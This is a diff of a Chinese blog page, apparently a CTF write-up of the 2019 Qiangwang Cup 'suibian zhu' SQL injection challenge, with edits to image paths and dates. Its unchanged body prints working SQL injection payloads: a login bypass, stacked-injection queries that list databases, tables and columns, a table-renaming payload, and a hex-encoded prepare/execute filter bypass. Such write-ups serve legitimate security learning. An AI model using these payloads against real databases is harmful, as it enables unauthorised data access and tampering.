@@ -27,19 +27,19 @@
 <meta property="og:site_name" content="cr0fyの博客">
 <meta property="og:description" content="这个题目有一点难度，单独放一个方便自己学习">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://example.com/.com//suibian1.png">
-<meta property="og:image" content="http://example.com/.com//suibian2.png">
-<meta property="og:image" content="http://example.com/.com//suibian3.png">
-<meta property="og:image" content="http://example.com/.com//suibian4.png">
-<meta property="og:image" content="http://example.com/.com//suibian5.png">
-<meta property="og:image" content="http://example.com/.com//suibian6.png">
-<meta property="og:image" content="http://example.com/.com//suibian7.png">
-<meta property="og:image" content="http://example.com/.com//suibian8.png">
+<meta property="og:image" content="http://example.com/images/suibian1.png">
+<meta property="og:image" content="http://example.com/images/suibian2.png">
+<meta property="og:image" content="http://example.com/images/suibian3.png">
+<meta property="og:image" content="http://example.com/images/suibian4.png">
+<meta property="og:image" content="http://example.com/images/suibian5.png">
+<meta property="og:image" content="http://example.com/images/suibian6.png">
+<meta property="og:image" content="http://example.com/images/suibian7.png">
+<meta property="og:image" content="http://example.com/images/suibian8.png">
 <meta property="article:published_time" content="2021-09-14T02:24:38.000Z">
-<meta property="article:modified_time" content="2021-09-26T12:42:43.955Z">
+<meta property="article:modified_time" content="2021-11-15T12:25:40.099Z">
 <meta property="article:author" content="cr0fy">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://example.com/.com//suibian1.png">
+<meta name="twitter:image" content="http://example.com/images/suibian1.png">
 
 <link rel="canonical" href="http://example.com/2021/09/14/[%E5%BC%BA%E7%BD%91%E6%9D%AF%202019]%E9%9A%8F%E4%BE%BF%E6%B3%A8/">
 
@@ -201,7 +201,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2021-09-26 20:42:43" itemprop="dateModified" datetime="2021-09-26T20:42:43+08:00">2021-09-26</time>
+                <time title="修改时间：2021-11-15 20:25:40" itemprop="dateModified" datetime="2021-11-15T20:25:40+08:00">2021-11-15</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -235,30 +235,30 @@
 <span id="more"></span>
 <h2 id="常规"><a href="#常规" class="headerlink" title="常规"></a>常规</h2><p>开头用万能密码试试水</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin<span class="string">&#x27; or &#x27;</span>1<span class="string">&#x27; = &#x27;</span>1</span><br></pre></td></tr></table></figure>
-<p>有回显<br><img src="/.com//suibian1.png" alt="Alt text"></p>
+<p>有回显<br><img src="/images/suibian1.png" alt="suibian1"></p>
 <p>测试字段数 </p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1<span class="string">&#x27; order by 1#</span></span><br></pre></td></tr></table></figure>
-<p>到3的时候报错，说明字段数为2<br><img src="/.com//suibian2.png" alt="Alt text"></p>
+<p>到3的时候报错，说明字段数为2<br><img src="/images/suibian2.png" alt="Alt text"></p>
 <p>下一步尝试union注入</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1<span class="string">&#x27; union select 1,2#</span></span><br></pre></td></tr></table></figure>
-<p>发现报错，并得知过滤的关键字<br><img src="/.com//suibian3.png" alt="Alt text"></p>
+<p>发现报错，并得知过滤的关键字<br><img src="/images/suibian3.png" alt="Alt text"></p>
 <p>看了大佬博客得知用堆叠注入（通过’;’注入多条SQL语句）</p>
 <p>先爆数据库</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1<span class="string">&#x27;;show databases;#</span></span><br></pre></td></tr></table></figure>
-<p><img src="/.com//suibian4.png" alt="Alt text"></p>
+<p><img src="/images/suibian4.png" alt="Alt text"></p>
 <p>然后爆表</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1<span class="string">&#x27;;show tables;#</span></span><br></pre></td></tr></table></figure>
-<p><img src="/.com//suibian5.png" alt="Alt text"></p>
+<p><img src="/images/suibian5.png" alt="Alt text"></p>
 <p>这里有两个表<br>先尝试words表</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1<span class="string">&#x27;;show columns from words;#</span></span><br></pre></td></tr></table></figure>
-<p><img src="/.com//suibian6.png" alt="Alt text"></p>
+<p><img src="/images/suibian6.png" alt="Alt text"></p>
 <p>然后爆1919810931114514表<br>要注意当表名为数字的时候，需要用反引号包起来查询</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1<span class="string">&#x27;;show columns from `1919810931114514`;#</span></span><br></pre></td></tr></table></figure>
-<p><img src="/.com//suibian7.png" alt="Alt text"></p>
+<p><img src="/images/suibian7.png" alt="Alt text"></p>
 <p>这个时候普通方法结束了，需要整一点骚操作</p>
 <p>在网上借鉴了大佬博客，发现有三种解题方法</p>
 <h2 id="解法1"><a href="#解法1" class="headerlink" title="解法1"></a>解法1</h2><h3 id="使用rename把words表改为其他表名。"><a href="#使用rename把words表改为其他表名。" class="headerlink" title="使用rename把words表改为其他表名。"></a>使用rename把words表改为其他表名。</h3><h3 id="把1919810931114514表的名字改为words"><a href="#把1919810931114514表的名字改为words" class="headerlink" title="把1919810931114514表的名字改为words."></a>把1919810931114514表的名字改为words.</h3><h3 id="将flag名改为id"><a href="#将flag名改为id" class="headerlink" title="将flag名改为id"></a>将flag名改为id</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1<span class="string">&#x27; ; rename table words to word1 ; rename table `1919810931114514` to words ; alter table words change flag id varchar(100);#</span></span><br></pre></td></tr></table></figure>
-<p><img src="/.com//suibian8.png" alt="Alt text"></p>
+<p><img src="/images/suibian8.png" alt="Alt text"></p>
 <h2 id="解法2"><a href="#解法2" class="headerlink" title="解法2"></a>解法2</h2><p>因为select被过滤，将select * from <code>1919810931114514</code>进行16进制编码<br>构造payload得到</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1<span class="string">&#x27;;SeT@a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare execsql from @a;execute execsql;#</span></span><br></pre></td></tr></table></figure>
 <h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><p>1.prepare…from…是预处理语句，会进行编码转换。<br>2.execute用来执行由SQLPrepare创建的SQL语句。<br>3.SELECT可以在一条语句里对多个变量同时赋值,而SET只能一次对一个变量赋值。</p>
@@ -268,7 +268,6 @@
 <h2 id="知识点总结"><a href="#知识点总结" class="headerlink" title="知识点总结"></a>知识点总结</h2><h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1<span class="string">&#x27;;show databases;# //数据库</span></span><br><span class="line"><span class="string">1&#x27;</span>;show tables;<span class="comment">#  //表名</span></span><br><span class="line">1<span class="string">&#x27;;show columns from table;#   //字段</span></span><br></pre></td></tr></table></figure>
 
 <h3 id="修改表名和字段名"><a href="#修改表名和字段名" class="headerlink" title="修改表名和字段名"></a>修改表名和字段名</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">//改列名</span><br><span class="line">alter table &quot; table_name&quot; change &quot; column1&quot; &quot; column2&quot; type;</span><br><span class="line"></span><br><span class="line">alter table &quot;table_name&quot; rename &quot;column1&quot; to &quot;column2&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//把table_name表下的column改名为new_column</span><br><span class="line">alter table &#x27;table_name&#x27; change &#x27;column&#x27; &#x27;new_column&#x27; type;</span><br><span class="line"></span><br><span class="line">//添加一个列</span><br><span class="line">alter table &quot; table_name&quot; add &quot; column_name&quot;  type;</span><br><span class="line"></span><br><span class="line">//删除一个列</span><br><span class="line">alter table &quot; table_name&quot; drop &quot; column_name&quot;  type;</span><br><span class="line"></span><br><span class="line">//改变列的数据类型</span><br><span class="line">alter table &quot; table_name&quot; alter column &quot; column_name&quot; type;</span><br></pre></td></tr></table></figure>
-
 
 
 
@@ -303,8 +302,8 @@
         
     <div class="post-nav">
       <div class="post-nav-item">
-    <a href="/2021/09/04/2021%E4%BA%91%E7%88%86%E6%9D%AF_%E5%9B%9B%E6%A0%A1%E8%81%94%E8%80%83/" rel="prev" title="2021云爆杯_四校联考">
-      <i class="fa fa-chevron-left"></i> 2021云爆杯_四校联考
+    <a href="/2021/09/14/sha1%E5%BC%BA%E7%A2%B0%E6%92%9E/" rel="prev" title="BUU刷题日记[1]web">
+      <i class="fa fa-chevron-left"></i> BUU刷题日记[1]web
     </a></div>
       <div class="post-nav-item">
     <a href="/2021/09/14/BUU%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0%5B1%5Dweb/" rel="next" title="BUU刷题日记[1]web">
@@ -384,7 +383,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">4</span>
+          <span class="site-state-item-count">5</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
